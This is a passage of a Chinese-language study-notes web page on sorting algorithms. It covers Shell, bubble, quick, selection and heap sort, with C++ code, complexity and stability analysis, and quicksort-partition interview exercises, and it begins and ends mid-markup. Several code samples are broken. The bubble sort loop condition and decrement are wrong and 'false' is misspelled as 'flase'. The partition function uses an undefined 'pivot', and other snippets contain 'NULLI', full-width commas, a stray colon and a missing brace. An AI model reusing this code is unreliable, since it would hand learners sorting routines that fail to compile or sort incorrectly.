class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>复杂度</strong></p><p>直接插入排序的<strong>时间复杂度</strong>为$O(n^2)$，空间复杂度为$O(1)$。</p><p>在最好情况下，表中元素已经有序，此时每插入一个元素，都只需比较一次而不用移动元素，因而时间复杂度为$O(n)$。</p></li><li><p><strong>稳定性</strong></p><p>由于每次插入元素时总是从后向前先比较再移动，所以不会出现相同元素相对位置发生变化的情况，即直接插入排序是一个<strong>稳定</strong>的排序方法。</p></li><li><p><strong>缺点</strong>：</p><p>1）寻找插入位置（耗时，需要从后往前一个个扫描）；</p><p>2）移动元素（需要将插入位置的元素全部后移）；</p></li><li><p><strong>优化</strong></p><p>1）对于寻找插入位置的优化，可以使用二分查找法，由此引出折半插入排序。</p><p><strong>折半插入排序</strong>：在有序区查找插入位置时，将从后往前的逐个比较优化为折半查找方法，找到插入位置后再集中将后面的元素后移，最后插入。</p><p>折半插入排序其实仅减少了元素的比较次数，对移动元素的性能并没有改善。其平均时间复杂度依然为$O(n^2)$，空间复杂度为$O(1)$，是一种稳定的排序方法。</p><p>2）携带多个元素进行插入，每次可以移动更多位数，减少移动次数</p><p>3）将数组改为链表结构，无需移动元素</p><p>4）希尔排序</p></li></ul><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><p><strong>基本思想</strong>：先将待排序表分割成若干形如$L[i, i+d, i+2d, ……, i+kd]$的“特殊”子表，分别进行直接插入排序，当整个表中元素已呈“基本有序”时，再对全体记录进行一次直接插入排序。</p><p>希尔排序的排序过程如下：</p><p>先取一个**小于n的步长$d_1$**，把表中全部记录分成$d_1$个组，所有距离为$d_1$的倍数的记录放在同一个组中，在各组中进行直接插入排序；然后取第二个步长$d_2&lt;d_1$，重复上述过程，直到所取到的$d_t&#x3D;1$，即所有记录已放在同一组中，再进行直接插入排序，由于此时已经具有较好的局部有序性，故可以很快得到最终结果。到目前为止，<u>尚未求得一个最好的增量序列，希尔提出的方法是</u>$d_1&#x3D;n&#x2F;2$，$d_{i+1}&#x3D;\lfloor d_i&#x2F;2 \rfloor $，并且最后一个增量等于1。</p><p>每一步的步长$d_t$逐渐减小，先让序列大致有序，然后随着$d_t$减小调整分组方式，组序列越来越长，整体序列也逐渐趋向有序。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220718151003466.png" alt="image-20220718151003466" style="zoom:20%;"><p>比如，如下图片中，透明方块一行代表待排序序列，总共15个元素，所以$d_1&#x3D;15&#x2F;2&#x3D;7$，步长为7，序列会被划分为7个组，第二行中同色方块代表同组元素（7种颜色），第三行代表在每组中进行直接插入排序后的序列：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220718155519817.png" alt="image-20220718155519817"></p><p>接着，$d_2&#x3D;7&#x2F;2&#x3D;3$，步长为3，所有元素被划分为3个组，图中第二行有三种颜色，第三行代表在每组中进行直接插入排序后的序列：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220718155752465.png" alt="image-20220718155752465"></p><p>最后，$d_3&#x3D;3&#x2F;2&#x3D;1$，步长为1，所有元素被划分为1个组，也就是对序列整体进行一次直接插入排序，所以图中第二行只有一种颜色，第三行代表直接插入排序后的序列，这样就得到了最终排序好的序列：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220718160200882.png" alt="image-20220718160200882"></p><p>希尔排序的 <strong>核心思想</strong> 是化远为近，将相隔较远的元素放在一组，组成短序列进行直接插入排序，逐渐使序列整体趋近有序，减少了查找次数和元素移动的次数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span> <span class="params">(RecType R[], <span class="type">int</span> n)</span></span>&#123;  <span class="comment">// n为数组长度</span></span><br><span class="line">    <span class="type">int</span> i, j, d;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    d = n/<span class="number">2</span>;        <span class="comment">// 增量置初值</span></span><br><span class="line">    <span class="keyword">while</span>(d&gt;<span class="number">0</span>)&#123;     <span class="comment">// 直到增量为0结束，因为最后一个增量必定为1，1/2=0</span></span><br><span class="line">        <span class="comment">// 对步长为d的所有分组采用直接插入排序，i首先定位到所有分组的第二个元素，即R[d]、R[d+1]、……，结束后继续往后定位到第三个元素……直到序列末尾</span></span><br><span class="line">        <span class="keyword">for</span>(i=d;i&lt;n;i++) &#123;</span><br><span class="line">            <span class="comment">// 对R[i]进行直接插入排序</span></span><br><span class="line">            tmp = R[i];         <span class="comment">// 暂存要插入的元素</span></span><br><span class="line">            j = i-d;            <span class="comment">// 前一个元素</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; tmp.key&lt;R[j].key)&#123;</span><br><span class="line">                R[j+d] = R[j];  <span class="comment">// 组内元素后移</span></span><br><span class="line">                j = j-d;        <span class="comment">// 继续比较前一个元素</span></span><br><span class="line">            &#125;</span><br><span class="line">            R[j+d] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        d = d/<span class="number">2</span>;      <span class="comment">// 减小增量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>复杂度</strong></p><p>希尔排序的时间复杂度依赖于增量序列的函数，这涉及数学上尚未解决的难题，难以分析，一般认为其平均时间复杂度为$O(n^{1.3})$，最坏情况下为$O(n^2)$。希尔排序空间复杂度为$O(1)$。</p></li><li><p><strong>稳定性</strong></p><p>当相同关键字的元素被划分到不同的分组时，可能会改变它们之间的相对次序，因此,希尔排序是一一个<strong>不稳定</strong>的排序方法。</p></li></ul><h3 id="5-2-交换排序"><a href="#5-2-交换排序" class="headerlink" title="5.2 交换排序"></a>5.2 交换排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><ul><li><p><strong>基本思想</strong></p><p>假设待排序表长为n，从后往前(或从前往后)<u>两两比较相邻元素</u>的值，若为逆序（即R[i-1]&gt;R[i]），则交换它们，直到序列比较完。我们称它为一趟冒泡，结果将最小的元素交换到待排序列的第一个位置。下一趟冒泡时， 前一趟确定的最小元素不再参与比较，待排序列减少一个元素，每趟冒泡的结果把序列中的最小元素放到了序列的最终位置。这样<u>最多做n-1趟冒泡</u>就能把所有元素排好序。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/bubbleSort.gif" alt="动图演示"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(RecType R[], <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 从前往后比较,将无序区最大值移到末尾</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)&#123;         <span class="comment">// 最多比较n-1轮</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&gt;n-i<span class="number">-1</span>; j--)&#123;   <span class="comment">// 第i轮比较到n-i-1位置为止，后面的部分是有序的</span></span><br><span class="line">            <span class="keyword">if</span>(R[j].key &gt; R[j+<span class="number">1</span>].key)&#123;</span><br><span class="line">                tmp = R[j];</span><br><span class="line">                R[j] = R[j+<span class="number">1</span>];</span><br><span class="line">                R[j+<span class="number">1</span>] = tmp;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;         </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == flase)   <span class="comment">// 本轮没有发生交换，已经完全有序</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>复杂度</strong></p><p>最坏情况下时间复杂度为$O(n^2)$，最好情况下(表中元素基本有序)时间复杂度为$O(n)$，其平均时间复杂度为$O(n^2)$。空间复杂度为$O(1)$。</p></li><li><p><strong>稳定性</strong></p><p>冒泡排序是一个<strong>稳定</strong>的排序方法。</p><p>注意：冒泡排序中所产生的有序子序列一定是全局有序的(不同于直接插入排序)，也就是说有序子序列中的所有元素的关键字一定小于或大于无序子序列中所有元素的关键字，这样每一趟排序都会将一个元素放置到其最终的位置上。</p></li></ul><h4 id="x3D-x3D-快速排序-x3D-x3D-（常考）"><a href="#x3D-x3D-快速排序-x3D-x3D-（常考）" class="headerlink" title="&#x3D;&#x3D;快速排序&#x3D;&#x3D;（常考）"></a>&#x3D;&#x3D;快速排序&#x3D;&#x3D;（常考）</h4><ul><li><p><strong>基本思想</strong></p><p>基于**<u>分治法</u><strong>。首先从待排序序列中取一个元素作为</strong>基准数<strong>；然后扫描序列，将比基准数小的元素全部放到它的左边，大于或等于基准数的元素全部放到它的右边，得到</strong>左右两个区间**；接着再对左右区间重复第二步，<u>直到各区间少于两个元素</u>。</p><p>代码实现中，采用了**<u>挖坑填数</u>**的方法。首先取出基准数的位置（挖坑），从右往左扫描出小于基准数的元素填坑（得到新坑），再从左往右扫描出大于等于基准数的元素填新坑，这样循环下去直到两指针重合，将基准数填入即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">paritition</span><span class="params">(RecType R[], <span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;   <span class="comment">// 一趟划分</span></span><br><span class="line">   <span class="type">int</span> tmp = R[left];     <span class="comment">// 第一个数做为基准数</span></span><br><span class="line">   <span class="keyword">while</span> (left &lt; right) &#123;   <span class="comment">// 指针未重合时</span></span><br><span class="line">       <span class="keyword">while</span> (left &lt; right &amp;&amp; R[right] &gt;= pivot)   <span class="comment">// 定位到右区间中小于基准数的元素</span></span><br><span class="line">           --right;</span><br><span class="line">       R[left] = R[right];    <span class="comment">// 填坑</span></span><br><span class="line">       <span class="keyword">while</span> (left &lt; right &amp;&amp; R[left] &lt;= pivot)    <span class="comment">// 定位到左区间中大于基准数的元素</span></span><br><span class="line">           ++left;</span><br><span class="line">       R[right] = R[left];    <span class="comment">// 填坑</span></span><br><span class="line">   &#125;</span><br><span class="line">   R[left] = tmp;</span><br><span class="line">   <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QuickSort</span><span class="params">(RecType R[], <span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123; <span class="comment">//快排函数</span></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        tmp = <span class="built_in">paritition</span>(R, left, right);</span><br><span class="line">        <span class="built_in">QuickSort</span>(R, left, tmp<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">QuickSort</span>(R, tmp+<span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>时间复杂度</strong></p><p>快速排序的<strong>运行时间与划分是否对称有关</strong>，而后者又与具体使用的划分算法有关。快速排序的最坏情况发生在两个区域分别包含n-1个元素和0个元素时，这种最大程度的不对称性若发生在每一层递归上，即对应于<strong>初始排序表基本有序或基本逆序时，就得到最坏情况下的时间复杂度为</strong>$O(n^2)$；最好情况下，每次划分都能对称，即<strong>基准数就是区间的中值，那么最好情况下时间复杂度为</strong>$O(nlog_2n)$。</p></li><li><p><strong>空间复杂度</strong></p><p>由于快速排序是递归的，需要<u>借助一个递归工作栈</u>来保存每一层递归调用的必要信息，其容量应与递归调用的最大深度一致。最好情况下，所取基准数就是区间的中值，每次能划分出长度相等的左右区间，所以递归树高度为$\lceil log_2n \rceil$；最坏情况下，因为要进行n-1次递归调用，所以栈的深度为$O(n)$；平均情况下，栈的深度为$O(log_2n)$。因而空间复杂度在<u>最坏情况下为$O(n)$，平均情况下为$O(log_2n)$</u>。</p></li><li><p><strong>稳定性</strong>：</p><p>在划分算法中，若右端区间存在两个关键字相同，且均小于基准值的元素，则在交换到左端区间后，它们的相对位置会发生变化，即快速排序是一个<strong>不稳定</strong>的排序方法。</p><p>注意：在快速排序算法中，并不产生有序子序列，但每一趟排序后会将一个元素（基准元素）放到其最终的位置上。</p></li><li><p><strong>优化</strong></p><p>1）当递归过程中划分得到的子序列的规模较小时不要再继续递归调用快速排序，可以采用直接插入排序算法进行后续的排序工作。</p><p>2）尽量选取一个可以将数据中分的基准数。如从序列的头尾以及中间选取三个元素，再取这三个元素的中间值作为最终的基准数；或者随机从当前序列中选取基准数，这样做使得最坏情况在实际排序中几乎不会发生。</p><p>在最理想的状态下，即partition可能做到最平衡的划分，得到的两个子问题的大小都不可能大于n&#x2F;2，在这种情况下，快速排序的运行速度将大大提升，此时，时间复杂度为$O(nlog_2n)$。 好在<u>快速排序平均情况下运行时间与其最佳情况下的运行时间很接近</u>，而不是接近其最坏情况下的运行时间。<br>快速排序是所有内部排序算法中平均性能最优的排序算法。</p></li></ul><h4 id="快排一次排序的应用"><a href="#快排一次排序的应用" class="headerlink" title="快排一次排序的应用"></a>快排一次排序的应用</h4><blockquote><p>例1：一个数组中存储有且仅有大写和小写字母，编写一个函数对数组内的字母重新排列，让小写字母在所有大写字母之前。(2012. 中兴、2013 ●腾讯)</p></blockquote><p>该题直接使用快排的一次区间划分即可，左右指针索引从两端向中间扫描，挖坑填数。代码略。</p><blockquote><p>例2：给定含有n个元素的整型数组a,其中包括0元素和非0元素，对数组进行排序，要求：(2012.人民搜索)</p><ol><li>排序后所有0元素在前，所有非零元素在后，且非零元素排序前后相对位置不变</li><li>不能使用额外存储空间</li></ol></blockquote><p>该题需要使用快排的一次空间划分，相当于基准数为0。注意，由于<strong>需要保持非零元素排序前后相对位置不变</strong>，所以不能使用左右指针索引从两端向中间扫描的办法。这里使用的是<strong>将相对位置在左的非0元素依次与在右的0元素交换的方法，这样不会破坏排序前元素的相对位置</strong>，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">partition</span><span class="params">(<span class="type">int</span> R[], <span class="type">int</span> p, <span class="type">int</span> r)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i=r+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=r; j &gt;= p; --j) &#123;    <span class="comment">//从后往前遍历</span></span><br><span class="line"><span class="keyword">if</span>(R[j]!=<span class="number">0</span>) &#123;   <span class="comment">// 遇到非0元素j就后移，即将其与位置--i的元素互换（两种情况：与自身互换；与0元素互换）</span></span><br><span class="line">--i;</span><br><span class="line"><span class="type">int</span> temp=R[i];</span><br><span class="line">R[i]=R[j] ;</span><br><span class="line">R[j]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// return i-1;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">7</span>]=&#123;<span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>，<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">partition</span>(a, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者从前往后遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">partition</span><span class="params">(<span class="type">int</span> R[], <span class="type">int</span> p, <span class="type">int</span> r)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i=p<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=p; j &lt;= r<span class="number">-1</span>; ++j) &#123;    <span class="comment">//从前往后遍历</span></span><br><span class="line"><span class="keyword">if</span>(R[j] == <span class="number">0</span>) &#123;   <span class="comment">// 遇到0元素j就前移，即将其与位置++i的元素互换（两种情况：与自身互换；与0元素互换）</span></span><br><span class="line">++i;</span><br><span class="line"><span class="type">int</span> temp=R[i];</span><br><span class="line">R[i]=R[j] ;</span><br><span class="line">R[j]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// return i+1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>例3：进阶——荷兰国旗问题</p><p>将乱序的红白蓝三色小球排列成同颜色在一起的小球组(按照红白蓝排序)，这个问题称为荷兰国旗问题。这是因为我们可以将红白蓝三色小球想象成条状物，有序排列后正好组成荷兰国旗。序列中，0表示红球，1表示白球，2表示蓝球。</p></blockquote><p>这个问题类似于快排的区间划分问题，但是这里需要使用3个指针索引，而不是2个。使用begin指针指向0元素应该在的位置，current用于跳过1元素，end用以指向2元素应该在的位置。begin和current都初始化指向数组首部，end初始化指向数组尾部。代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (current&lt;=end) &#123;</span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line"><span class="keyword">if</span> (array[current] == <span class="number">0</span>) &#123;      <span class="comment">// 0元素前移，current与begin交换</span></span><br><span class="line">tmp = array[current];</span><br><span class="line">        array[current] = array[begin];</span><br><span class="line">        array[begin] = tmp;</span><br><span class="line">current++;</span><br><span class="line">begin++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (array[current] == <span class="number">1</span>)&#123;  <span class="comment">// 1元素不动</span></span><br><span class="line">current++:</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;                          <span class="comment">// 2元素后移，current与end交换</span></span><br><span class="line">tmp = array[current];</span><br><span class="line">        array[current] = array[end];</span><br><span class="line">        array[end] = tmp;</span><br><span class="line">end--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>例4：最小的k个数</p><p>输入n个整数，输出其中最小的k个。(2012.网易)</p><p>例如输入1, 2, 3，4, 5,，6, 7, 8这8个数字，则最小的4个数字为1, 2, 3, 4。</p></blockquote><p>最简单的思路莫过于把输入的n个整数排序，这样排在最前面的k个数就是最小的k个数。只是这种思路的时间复杂度为O(nlogn)。这里同样可以使用快排区间划分的方法：</p><p>我们设最小的k个数中最大的数为A。在快速排序算法中，我们先在数组中随机选择一个数字，然后调整数组中数字的顺序，使得比选中的数字小的数字都排在它的左边，比选中的数字大的数字都排在它的右边( 即快排一次排序)。 如果快排一次划分后这个选中的数字的下标刚好是k-1 (下标从0开始)，那么这个数字(就是A)加上左侧的k-1个数字就是最小的k个数。如果它的下标大于k-I，那么A位于它的左边，我们可以接着在它的左边部分的数组中查找；如果它的下标小于k-1,那么A应该位于它的右边，我们可以接着在它的右边部分的数组中查找。</p><p>可见，这是一个递归问题，但是注意我们找到的k个数不一定是有序的。可以用如下代码实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* input是输入的数组，元素个数为n, output是用来保存最小k个数的数组*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getLeastKNum</span> <span class="params">(<span class="type">int</span>* input, <span class="type">int</span> n, <span class="type">int</span>* output, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(input == <span class="literal">NULL</span> || output = NULLI || k &gt; n || k&lt;=<span class="number">0</span> || n&lt;=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> start = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> end = n<span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> index = <span class="built_in">partition</span> (input, start, end) ;   <span class="comment">//一次划分函数见前面</span></span><br><span class="line"><span class="keyword">while</span> (index != k<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (index &gt; k<span class="number">-1</span>) &#123;   <span class="comment">// 左区间已包含超过k个数</span></span><br><span class="line">end=index- <span class="number">1</span>;</span><br><span class="line">index = <span class="built_in">Partition</span> (input, start , end);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">start = index+<span class="number">1</span>;</span><br><span class="line">index = <span class="built_in">Partition</span> (input，start, end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直到index == k-1 为止</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; k;++i)</span><br><span class="line">output[i] = input[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意上述方法平均时间复杂度为O(n)。</p><h3 id="5-3-选择排序"><a href="#5-3-选择排序" class="headerlink" title="5.3 选择排序"></a>5.3 选择排序</h3><h4 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h4><p>从头至尾扫描序列，找出最小的一个元素和第一个元素交换，接着从剩下的元素中继续这种选择和交换方式，最终<br>得到一个有序序列。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719102551096.png" style="zoom:15%;"><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/selectionSort.gif" alt="动图演示"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(RecType R[], <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, min_index;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">        min_index = i;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>; j&lt;n; j++)&#123;   <span class="comment">// 定位无序区最小元素</span></span><br><span class="line">            <span class="keyword">if</span>(R[j].key &lt; R[min_index].key)</span><br><span class="line">                min_index = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(min_index != i)&#123;    <span class="comment">// 无序区第一个元素和无序区最小元素交换</span></span><br><span class="line">            tmp = R[i];</span><br><span class="line">            R[i] = R[min_index];</span><br><span class="line">            R[min_index] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>复杂度</strong>：</p><p>简单选择排序过程中，元素移动的操作次数很少，不会超过3(n-1)次（一次swap需要3次元素移动），最好的情况是移动0次，此时对应的表已经有序；但元素间比较的次数与序列的初始状态无关，始终是n(n-1)&#x2F;2次，所以<strong>时间复杂度始终是</strong>$O(n^2)$。<strong>空间复杂度</strong>：$O(1)$。</p></li><li><p><strong>稳定性</strong>：不稳定。</p></li><li><p>选择排序中，每一趟选择最小元素前移后，该元素都是处于其最终的位置上。</p></li></ul><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><p><strong>Heapsort</strong> 是指利用堆这种数据结构所设计的一种排序算法。</p><p>堆积具有以下特点：</p><p>1）完全二叉树</p><p>2）子结点的键值或索引总是小于等于（或者大于等于）它的父节点。</p><p>在大根堆中，最大元素存放在根结点中，且对其任一非根结点，它的值小于等于其双亲结点值。小根堆的定义刚好相反，根结点是最小元素。</p><p>对于关键字序列$(R_1,R_2,…,R_n)$构建的完全二叉树，结点$R[i]$的左孩子为$R[2i]$，右孩子为$R[2i+1]$。由于一般待排序的数组<u>从0开始编号，所以改为结点$R[i]$的左孩子为$R[2i+1]$，右孩子为$R[2i+2]$。</u></p><p><strong>算法思想</strong>：</p><p><a href="https://www.bilibili.com/video/BV1Ur4y1w7tv?p=20&amp;vd_source=854e3e80724343215a332be36ec7cf83">https://www.bilibili.com/video/BV1Ur4y1w7tv?p=20&amp;vd_source=854e3e80724343215a332be36ec7cf83</a></p><ol><li>将初始待排序关键字序列$(R_0,R_1,…,R_{n-1})$构建成大顶堆，此堆为初始的无序区；</li><li>将堆顶元素R[0]与最后一个元素$R[n-1]$交换，此时得到新的无序区$(R_0,R_1,…,R_{n-2})$和新的有序区$(R_{n-1})$，且满足$R[1,2,…,n-2]&lt;&#x3D;R[n-1]$；</li><li>由于交换后新的堆顶$R[0]$可能违反堆的性质，因此需要对当前无序区调$(R_0,R_1,…,R_{n-2})$<strong>调整为新堆</strong>，然后再次将$R[0]$与无序区最后一个元素<strong>交换</strong>，得到新的无序区$(R_0,R_1,…,R_{n-3})$和新的有序区$(R_{n-2}, R_{n-1})$。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。</li></ol><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/heapSort.gif" alt="动图演示"></p><p>下面的代码已经调整为从R[0]开始存储元素，所以左右孩子结点分别为2i+1、2i+2。调整堆后根结点为R[0]。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调整根索引为start，最大结点索引不超过end的完全二叉树为大根堆，或者说从中筛选出最大值作为根结点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AdjustDown</span><span class="params">(RecType R[], <span class="type">int</span> start, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> dad = start, son = <span class="number">2</span>*dad+<span 